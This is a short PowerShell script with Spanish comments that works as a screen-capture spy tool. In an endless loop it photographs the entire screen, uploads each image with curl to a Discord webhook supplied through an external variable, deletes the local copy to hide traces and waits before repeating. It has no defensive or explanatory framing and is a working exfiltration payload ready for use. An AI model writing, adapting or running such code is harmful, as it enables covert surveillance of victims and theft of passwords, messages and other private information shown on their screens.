# Definir la ruta de la carpeta de documentos
$documentsFolder = [Environment]::GetFolderPath("MyDocuments")

# Definir el nombre aleatorio del archivo
$randomFileName = [System.IO.Path]::GetRandomFileName()

# Definir la ruta completa del archivo de captura de pantalla
$filePath = Join-Path -Path $documentsFolder -ChildPath "$randomFileName.png"

# Definir la URL del webhook de Discord
$webhookUrl = "$dc"

# Bucle principal: tomar una captura de pantalla, enviarla al webhook y esperar
While ($true) {
    # Tomar una captura de pantalla y guardarla en la carpeta de documentos con un nombre aleatorio
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
    
    # Enviar la captura de pantalla al webhook de Discord
    curl.exe -F "file1=@$filePath" $webhookUrl
    
    # Eliminar la captura de pantalla después de enviarla
    Remove-Item -Path $filePath
    
    # Esperar el intervalo de tiempo especificado antes de tomar la próxima captura de pantalla
    Start-Sleep -Seconds $seconds
}
